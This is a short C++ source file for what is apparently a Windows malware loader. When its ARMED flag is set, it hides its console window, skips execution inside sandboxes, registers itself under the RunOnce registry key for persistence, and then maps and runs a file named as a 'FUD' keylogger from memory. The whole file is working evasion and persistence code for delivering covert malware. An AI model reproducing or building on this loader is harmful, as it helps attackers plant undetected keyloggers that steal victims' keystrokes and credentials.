#include "pch.h"
#include "example.h"

int example::start(int argc, char* argv[]) {
	if constexpr (ARMED) FreeConsole();
	if constexpr (!ARMED) std::cout << "example start" << std::endl;
	if constexpr (!ARMED) std::cout << "checking sandbox" << std::endl;
	if (ARMED && sandboxdetect::is_sandboxed()) return 1;

	if constexpr (!ARMED) std::cout << "adding autostart" << std::endl;
	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);
	if constexpr (!ARMED) std::wcout << L"file: " << location << std::endl;
	const bool aa = autostart::addto_runonce(location);
	if constexpr (!ARMED) {
		if (aa) std::cout << "added to runonce regkey" << std::endl;
		else std::cout << "failed adding registry key" << std::endl;
	}
	
	if constexpr (!ARMED) std::cout << "mapping exe to memory" << std::endl;
	const auto raw = loadpe::loadFile("C:\\Users\\Admin\\Desktop\\windows-fud-keylogger-r32.exe");
	if constexpr (!ARMED) std::cout << "running mapped exe from memory" << std::endl;
	loadpe::runPE(raw);

	if constexpr (!ARMED) std::cout << "example end" << std::endl;
	return 0;
}
